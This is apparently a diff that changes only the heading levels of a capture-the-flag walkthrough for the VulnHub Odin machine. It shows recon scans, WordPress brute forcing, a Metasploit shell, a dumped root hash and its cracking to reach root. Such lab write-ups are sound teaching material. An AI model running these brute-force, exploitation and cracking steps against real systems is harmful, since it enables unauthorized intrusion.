@@ -4,9 +4,7 @@
 Available on VulnHub: https://www.vulnhub.com/entry/odin-1,619/
 
 
-## Walkthrough
-
-### IP Discovery
+## IP Discovery
 
 ```
 $ sudo netdiscover -r 192.168.1.0/16
@@ -29,7 +27,7 @@ xxx.xxx.x.xxx   xx:xx:xx:xx:xx:xx      x      xx  xxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
 xxx.xxx.x.xxx   xx:xx:xx:xx:xx:xx      x      xx  xxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
 ```
 
-### Port Scanning
+## Port Scanning
 
 ```
 $ nmap -AT4 -p- 192.168.1.181
@@ -50,7 +48,7 @@ Service detection performed. Please report any incorrect results at https://nmap
 Nmap done: 1 IP address (1 host up) scanned in 10.63 seconds
 ```
 
-### HTML Source Analysis
+## HTML Source Analysis
 
 The page source has references for `http://odin/`. So I created a entry for my DNS hosts mapping target IP address.
 ```
@@ -72,7 +70,7 @@ $ echo "SWYgeW91IGxvb2sgY2xvc2VseSwgeW91IHdvbid0IG5lZWQgaXQgaGVyZQo=" | base64 -
 If you look closely, you won't need it here
 ```
 
-### Web Analysis
+## Web Analysis
 
 ```
 $ dirb http://192.168.1.181
@@ -242,7 +240,7 @@ by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
 ===============================================================
 ```
 
-### WordPress Analysis
+## WordPress Analysis
 
 ```
 $ wpscan -e ap,at,u --url http://192.168.1.181
@@ -323,7 +321,7 @@ Interesting Finding(s):
 [+] Elapsed time: 00:00:01
 ```
 
-### WordPress Login Brute Forcing
+## WordPress Login Brute Forcing
 
 I attempt to crack WordPress login with `wpscan`.
 ```
@@ -421,7 +419,7 @@ Scan Aborted: Canceled by User
 User: **admin**\
 Pass: **qwerty**
 
-### Exploiting
+## Exploiting
 
 ```
 $ msfconsole
@@ -485,7 +483,7 @@ OS          : Linux osboxes 5.4.0-26-generic #30-Ubuntu SMP Mon Apr 20 16:58:30 
 Meterpreter : php/linux
 ```
 
-### System Users
+## System Users
 
 ```
 meterpreter > shell
@@ -506,7 +504,7 @@ www-data@osboxes:/$ cat /home/rockyou/ok
 Get out of here!
 ```
 
-### WordPress Config
+## WordPress Config
 
 ```
 www-data@osboxes:/$ cat /var/www/html/wp-config.php
@@ -610,7 +608,7 @@ Root user hash found:
 root:$6$e9hWlnuTuxApq8h6$ClVqvF9MJa424dmU96Hcm6cvevBGP1OaHbWg//71DVUF1kt7ROW160rv9oaL7uKbDr2qIGsSxMmocdudQzjb01:18600:0:99999:7:::
 ```
 
-### Cracking Root Hash
+## Cracking Root Hash
 
 ```
 $ cat root.hash
@@ -632,7 +630,7 @@ Session completed
 User: **root**\
 Pass: **jasmine**
 
-### Privilege Escalation
+## Privilege Escalation
 
 ```
 www-data@osboxes:/$ su root
@@ -642,7 +640,7 @@ root@osboxes:/# id
 uid=0(root) gid=0(root) groups=0(root)
 ```
 
-### Root Flag
+## Root Flag
 
 ```
 root@osboxes:~# cat /root/bjorn
